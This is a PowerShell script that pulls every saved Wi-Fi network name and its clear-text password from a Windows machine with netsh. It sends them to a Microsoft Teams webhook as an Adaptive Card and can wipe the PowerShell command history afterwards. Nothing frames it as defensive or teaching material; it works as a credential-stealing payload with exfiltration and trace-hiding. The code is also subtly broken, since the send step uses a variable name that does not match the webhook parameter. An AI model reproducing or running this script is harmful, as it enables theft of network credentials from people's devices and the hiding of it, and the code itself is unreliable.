param(
    [string]$teamsWebhookURI,
    [switch]$returnResult,
    [switch]$clearHistory
)

# Create an array to hold Wi-Fi data
$wifiProfiles = @()

# Create an array to hold Wi-Fi data
$wifiProfiles = @()

# Extract Wi-Fi names and passwords
netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+' | ForEach-Object {
    $wlan  = $_.Matches.Value.Trim()
    $passwResult = netsh wlan show profile $wlan key=clear | Select-String '(?<=Key Content\s+:\s).+'
    $passw = if ($passwResult) { $passwResult.Matches.Value.Trim() } else { 'No password found' }

    # Add the Wi-Fi name and password to the array
    $wifiProfiles += [PSCustomObject]@{
        wifiName = $wlan
        wifiPassword = $passw
    }
}

if ($teamsWebhookURI)
{
    # Construct the Adaptive Card JSON with the Wi-Fi names and passwords
    $card = @{
        type = "message"
        attachments = @(
            @{
                contentType = "application/vnd.microsoft.card.adaptive"
                content = @{
                    type = "AdaptiveCard"
                    version = "1.0"
                    body = @(
                        @{
                            type = "TextBlock"
                            text = "Wi-Fi Profiles"
                            weight = "Bolder"
                            size = "Medium"
                        }
                    ) + (
                        # Create TextBlocks for each Wi-Fi name and password
                        $wifiProfiles | ForEach-Object {
                            @{
                                type = "TextBlock"
                                text = "Wi-Fi: $($_.wifiName) - Password: $($_.wifiPassword)"
                                wrap = $true
                            }
                        }
                    )
                    # The "$schema" key should be a string, not a variable
                    "schema" = "http://adaptivecards.io/schemas/adaptive-card.json"
                }
            }
        )
    }

    # Convert the card to JSON
    $Body = $card | ConvertTo-Json -Depth 10

    # Send the POST request to the Teams webhook
    Invoke-RestMethod -ContentType 'application/json' -Uri $webhookURI -Method Post -Body $Body
}

if ($clearHistory) {
    # Clear the PowerShell command history
    Clear-History
}

if ($returnResult) {
    # return the wifiProfiles
    return $wifiProfiles
}

